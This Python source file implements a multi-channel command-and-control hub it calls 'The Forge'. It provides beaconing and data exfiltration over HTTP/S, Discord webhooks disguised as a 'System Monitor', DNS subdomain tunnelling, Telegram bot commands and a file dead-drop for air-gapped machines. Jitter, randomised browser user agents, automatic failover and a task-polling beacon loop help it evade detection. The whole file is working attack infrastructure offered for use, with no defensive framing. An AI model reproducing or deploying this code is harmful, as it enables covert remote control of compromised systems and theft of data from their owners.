"""
The Forge — Multi-Channel C2 Hub
HTTP/S, Discord Webhook, DNS, Telegram, File Dead-Drop.
"""

import os
import json
import time
import random
import base64
import hashlib
import urllib.request
import urllib.parse
import urllib.error
import socket
import struct
import threading
from typing import Optional, Any
from datetime import datetime


# ---------------------------------------------------------------------------
# Base C2 Channel
# ---------------------------------------------------------------------------

class C2Channel:
    """Abstract base for all C2 channels."""

    def __init__(self, name: str, config: dict = None):
        self.name = name
        self.config = config or {}
        self.active = False
        self.last_checkin = None
        self.jitter = config.get("jitter", 0.3) if config else 0.3

    def connect(self) -> bool:
        raise NotImplementedError

    def send(self, data: bytes) -> bool:
        raise NotImplementedError

    def receive(self) -> Optional[bytes]:
        raise NotImplementedError

    def disconnect(self):
        self.active = False

    def _sleep_with_jitter(self, base_seconds: float):
        deviation = base_seconds * self.jitter
        time.sleep(max(0.1, base_seconds + random.uniform(-deviation, deviation)))

    def _log(self, msg: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{self.name}] {msg}")


# ---------------------------------------------------------------------------
# HTTP/S Channel
# ---------------------------------------------------------------------------

class HTTPChannel(C2Channel):
    """
    HTTP/S C2 channel.
    Supports GET (beacon) and POST (data exfil).
    """

    def __init__(self, url: str, user_agent: str = None, headers: dict = None, **kwargs):
        super().__init__("HTTP", kwargs)
        self.url = url.rstrip("/")
        self.user_agent = user_agent or self._random_ua()
        self.headers = headers or {}
        self.headers["User-Agent"] = self.user_agent

    def connect(self) -> bool:
        try:
            req = urllib.request.Request(
                f"{self.url}/beacon",
                headers=self.headers,
                method="GET"
            )
            resp = urllib.request.urlopen(req, timeout=10)
            self.active = resp.status == 200
            self.last_checkin = datetime.now()
            return self.active
        except Exception as e:
            self._log(f"Connect failed: {e}")
            return False

    def send(self, data: bytes) -> bool:
        try:
            encoded = base64.b64encode(data)
            req = urllib.request.Request(
                f"{self.url}/data",
                data=encoded,
                headers={**self.headers, "Content-Type": "application/octet-stream"},
                method="POST"
            )
            resp = urllib.request.urlopen(req, timeout=15)
            self.last_checkin = datetime.now()
            return resp.status == 200
        except Exception as e:
            self._log(f"Send failed: {e}")
            return False

    def receive(self) -> Optional[bytes]:
        try:
            req = urllib.request.Request(
                f"{self.url}/tasks",
                headers=self.headers,
                method="GET"
            )
            resp = urllib.request.urlopen(req, timeout=10)
            if resp.status == 200:
                data = resp.read()
                self.last_checkin = datetime.now()
                return base64.b64decode(data) if data else None
            return None
        except Exception:
            return None

    @staticmethod
    def _random_ua() -> str:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/17.2",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
        ]
        return random.choice(agents)


# ---------------------------------------------------------------------------
# Discord Webhook Channel
# ---------------------------------------------------------------------------

class DiscordWebhookChannel(C2Channel):
    """
    Use Discord webhooks as a C2 channel.
    Send data as file attachments or embedded content.
    """

    def __init__(self, webhook_url: str, **kwargs):
        super().__init__("Discord", kwargs)
        self.webhook_url = webhook_url
        self.max_content_len = 1900  # Discord message limit (with buffer)

    def connect(self) -> bool:
        try:
            req = urllib.request.Request(self.webhook_url, method="GET")
            resp = urllib.request.urlopen(req, timeout=10)
            self.active = resp.status == 200
            self.last_checkin = datetime.now()
            return self.active
        except Exception as e:
            self._log(f"Webhook validate failed: {e}")
            return False

    def send(self, data: bytes) -> bool:
        try:
            encoded = base64.b64encode(data).decode()

            # Small data → embed in message content
            if len(encoded) <= self.max_content_len:
                payload = json.dumps({
                    "content": f"```{encoded}```",
                    "username": "System Monitor"
                }).encode()
            else:
                # Large data → split into chunks
                chunks = [encoded[i:i + self.max_content_len]
                          for i in range(0, len(encoded), self.max_content_len)]
                for i, chunk in enumerate(chunks):
                    chunk_payload = json.dumps({
                        "content": f"[{i + 1}/{len(chunks)}] ```{chunk}```",
                        "username": "System Monitor"
                    }).encode()
                    req = urllib.request.Request(
                        self.webhook_url,
                        data=chunk_payload,
                        headers={"Content-Type": "application/json"},
                        method="POST"
                    )
                    urllib.request.urlopen(req, timeout=10)
                    self._sleep_with_jitter(1.0)  # Rate limit respect
                self.last_checkin = datetime.now()
                return True

            req = urllib.request.Request(
                self.webhook_url,
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            resp = urllib.request.urlopen(req, timeout=10)
            self.last_checkin = datetime.now()
            return resp.status in (200, 204)
        except Exception as e:
            self._log(f"Send failed: {e}")
            return False

    def receive(self) -> Optional[bytes]:
        # Discord webhooks are send-only. Use a bot token for bidirectional.
        self._log("Webhook channel is send-only. Use bot token for recv.")
        return None


# ---------------------------------------------------------------------------
# DNS Channel
# ---------------------------------------------------------------------------

class DNSChannel(C2Channel):
    """
    DNS-based C2 using TXT record queries.
    Encodes data in subdomain labels.
    """

    def __init__(self, domain: str, nameserver: str = "8.8.8.8", **kwargs):
        super().__init__("DNS", kwargs)
        self.domain = domain
        self.nameserver = nameserver
        self.max_label_len = 63  # DNS label limit
        self.max_subdomain_len = 253  # Total domain limit

    def connect(self) -> bool:
        try:
            # Test DNS resolution
            socket.getaddrinfo(self.domain, 53)
            self.active = True
            self.last_checkin = datetime.now()
            return True
        except Exception:
            return False

    def send(self, data: bytes) -> bool:
        """Encode data into DNS queries as subdomain labels."""
        try:
            encoded = base64.b32encode(data).decode().lower().rstrip("=")
            # Split into DNS label-sized chunks
            labels = [encoded[i:i + self.max_label_len]
                      for i in range(0, len(encoded), self.max_label_len)]
            for i, label in enumerate(labels):
                query = f"{label}.{i}.{self.domain}"
                try:
                    socket.getaddrinfo(query, None)
                except socket.gaierror:
                    pass  # Expected — we're using DNS for data, not resolution
                self._sleep_with_jitter(0.5)
            self.last_checkin = datetime.now()
            return True
        except Exception as e:
            self._log(f"DNS send failed: {e}")
            return False

    def receive(self) -> Optional[bytes]:
        """Query TXT record for commands."""
        try:
            # Build DNS TXT query manually
            query = f"cmd.{self.domain}"
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            # Minimal DNS query for TXT record
            txn_id = random.randint(0, 65535)
            header = struct.pack(">HHHHHH", txn_id, 0x0100, 1, 0, 0, 0)
            question = b""
            for part in query.split("."):
                question += struct.pack("B", len(part)) + part.encode()
            question += b"\x00" + struct.pack(">HH", 16, 1)  # TXT, IN

            sock.sendto(header + question, (self.nameserver, 53))
            resp, _ = sock.recvfrom(4096)
            sock.close()

            # Parse TXT data (simplified)
            if len(resp) > len(header + question):
                txt_data = resp[len(header + question):]
                if txt_data:
                    self.last_checkin = datetime.now()
                    return txt_data
            return None
        except Exception:
            return None


# ---------------------------------------------------------------------------
# Telegram Channel
# ---------------------------------------------------------------------------

class TelegramChannel(C2Channel):
    """
    Telegram Bot API as C2 channel.
    Send data to a chat, receive commands via getUpdates.
    """

    def __init__(self, bot_token: str, chat_id: str, **kwargs):
        super().__init__("Telegram", kwargs)
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0

    def connect(self) -> bool:
        try:
            req = urllib.request.Request(f"{self.base_url}/getMe")
            resp = urllib.request.urlopen(req, timeout=10)
            data = json.loads(resp.read())
            self.active = data.get("ok", False)
            self.last_checkin = datetime.now()
            return self.active
        except Exception as e:
            self._log(f"Telegram connect failed: {e}")
            return False

    def send(self, data: bytes) -> bool:
        try:
            encoded = base64.b64encode(data).decode()
            # Split if too long for Telegram (4096 char limit)
            chunks = [encoded[i:i + 4000] for i in range(0, len(encoded), 4000)]
            for chunk in chunks:
                payload = json.dumps({
                    "chat_id": self.chat_id,
                    "text": f"```\n{chunk}\n```",
                    "parse_mode": "Markdown"
                }).encode()
                req = urllib.request.Request(
                    f"{self.base_url}/sendMessage",
                    data=payload,
                    headers={"Content-Type": "application/json"}
                )
                urllib.request.urlopen(req, timeout=10)
                self._sleep_with_jitter(0.5)
            self.last_checkin = datetime.now()
            return True
        except Exception as e:
            self._log(f"Telegram send failed: {e}")
            return False

    def receive(self) -> Optional[bytes]:
        try:
            url = f"{self.base_url}/getUpdates?offset={self.last_update_id + 1}&timeout=5"
            req = urllib.request.Request(url)
            resp = urllib.request.urlopen(req, timeout=15)
            data = json.loads(resp.read())
            if data.get("ok") and data.get("result"):
                for update in data["result"]:
                    self.last_update_id = update["update_id"]
                    msg = update.get("message", {}).get("text", "")
                    if msg.startswith("/cmd "):
                        self.last_checkin = datetime.now()
                        return msg[5:].encode()
            return None
        except Exception:
            return None


# ---------------------------------------------------------------------------
# File Dead-Drop Channel
# ---------------------------------------------------------------------------

class FileDeadDrop(C2Channel):
    """
    File-based C2 for air-gapped or local operations.
    Uses shared folders, USB drives, or cloud-synced directories.
    """

    def __init__(self, drop_dir: str, **kwargs):
        super().__init__("DeadDrop", kwargs)
        self.drop_dir = drop_dir
        self.inbox = os.path.join(drop_dir, ".tasks")
        self.outbox = os.path.join(drop_dir, ".results")

    def connect(self) -> bool:
        try:
            os.makedirs(self.inbox, exist_ok=True)
            os.makedirs(self.outbox, exist_ok=True)
            self.active = True
            self.last_checkin = datetime.now()
            return True
        except Exception:
            return False

    def send(self, data: bytes) -> bool:
        try:
            filename = f"{int(time.time())}_{hashlib.md5(data).hexdigest()[:8]}.drop"
            filepath = os.path.join(self.outbox, filename)
            with open(filepath, "wb") as f:
                f.write(base64.b64encode(data))
            self.last_checkin = datetime.now()
            return True
        except Exception as e:
            self._log(f"Dead drop write failed: {e}")
            return False

    def receive(self) -> Optional[bytes]:
        try:
            files = sorted(os.listdir(self.inbox))
            if files:
                filepath = os.path.join(self.inbox, files[0])
                with open(filepath, "rb") as f:
                    data = base64.b64decode(f.read())
                os.remove(filepath)  # Consume the task
                self.last_checkin = datetime.now()
                return data
            return None
        except Exception:
            return None


# ---------------------------------------------------------------------------
# C2 Hub — Multi-Channel Manager
# ---------------------------------------------------------------------------

class C2Hub:
    """
    Central C2 manager. Handles multiple channels with
    automatic failover, priority routing, and health monitoring.
    """

    def __init__(self):
        self.channels: dict[str, C2Channel] = {}
        self.primary: Optional[str] = None
        self.fallback_order: list[str] = []
        self._monitor_thread: Optional[threading.Thread] = None
        self._running = False

    def add_channel(self, channel: C2Channel, primary: bool = False):
        """Register a C2 channel."""
        self.channels[channel.name] = channel
        if primary or not self.primary:
            self.primary = channel.name
        if channel.name not in self.fallback_order:
            self.fallback_order.append(channel.name)

    def remove_channel(self, name: str):
        """Remove a C2 channel."""
        if name in self.channels:
            self.channels[name].disconnect()
            del self.channels[name]
            self.fallback_order = [n for n in self.fallback_order if n != name]
            if self.primary == name:
                self.primary = self.fallback_order[0] if self.fallback_order else None

    def connect_all(self) -> dict[str, bool]:
        """Connect all registered channels."""
        results = {}
        for name, channel in self.channels.items():
            results[name] = channel.connect()
        return results

    def send(self, data: bytes, channel_name: str = None) -> bool:
        """
        Send data through specified or primary channel.
        Falls back to other channels on failure.
        """
        # Try specified or primary channel first
        order = [channel_name] if channel_name else [self.primary] + [
            n for n in self.fallback_order if n != self.primary
        ]

        for name in order:
            if name and name in self.channels:
                channel = self.channels[name]
                if channel.active and channel.send(data):
                    return True

        # All channels failed
        return False

    def receive(self, channel_name: str = None) -> Optional[bytes]:
        """Receive from specified or all channels."""
        if channel_name and channel_name in self.channels:
            return self.channels[channel_name].receive()

        # Try all channels
        for name in self.fallback_order:
            if name in self.channels and self.channels[name].active:
                data = self.channels[name].receive()
                if data:
                    return data
        return None

    def get_status(self) -> dict:
        """Get status of all channels."""
        return {
            name: {
                "active": ch.active,
                "last_checkin": str(ch.last_checkin) if ch.last_checkin else "Never",
                "is_primary": name == self.primary,
            }
            for name, ch in self.channels.items()
        }

    def start_monitor(self, interval: float = 60.0):
        """Start background health monitoring thread."""
        self._running = True

        def _monitor():
            while self._running:
                for name, channel in self.channels.items():
                    if not channel.active:
                        channel.connect()  # Attempt reconnection
                time.sleep(interval)

        self._monitor_thread = threading.Thread(target=_monitor, daemon=True)
        self._monitor_thread.start()

    def stop_monitor(self):
        """Stop background health monitoring."""
        self._running = False
        if self._monitor_thread:
            self._monitor_thread.join(timeout=5)

    def beacon(self, interval: float = 30.0, callback=None):
        """
        Start beaconing loop on primary channel.
        Calls callback with received commands.
        """
        while self._running:
            data = self.receive()
            if data and callback:
                callback(data)
            primary_ch = self.channels.get(self.primary)
            if primary_ch:
                primary_ch._sleep_with_jitter(interval)


# ---------------------------------------------------------------------------
# Quick Factory
# ---------------------------------------------------------------------------

def create_http_c2(url: str, **kwargs) -> C2Hub:
    hub = C2Hub()
    hub.add_channel(HTTPChannel(url, **kwargs), primary=True)
    return hub


def create_discord_c2(webhook_url: str, **kwargs) -> C2Hub:
    hub = C2Hub()
    hub.add_channel(DiscordWebhookChannel(webhook_url, **kwargs), primary=True)
    return hub


def create_telegram_c2(bot_token: str, chat_id: str, **kwargs) -> C2Hub:
    hub = C2Hub()
    hub.add_channel(TelegramChannel(bot_token, chat_id, **kwargs), primary=True)
    return hub


def create_multi_c2(configs: list[dict]) -> C2Hub:
    """
    Create multi-channel C2 from config list.
    Each config: {"type": "http|discord|dns|telegram|file", ...params}
    """
    hub = C2Hub()
    builders = {
        "http": lambda c: HTTPChannel(c["url"], **{k: v for k, v in c.items() if k != "type" and k != "url"}),
        "discord": lambda c: DiscordWebhookChannel(c["webhook_url"]),
        "dns": lambda c: DNSChannel(c["domain"], c.get("nameserver", "8.8.8.8")),
        "telegram": lambda c: TelegramChannel(c["bot_token"], c["chat_id"]),
        "file": lambda c: FileDeadDrop(c["drop_dir"]),
    }
    for i, cfg in enumerate(configs):
        ch_type = cfg.get("type", "http")
        if ch_type in builders:
            hub.add_channel(builders[ch_type](cfg), primary=(i == 0))
    return hub
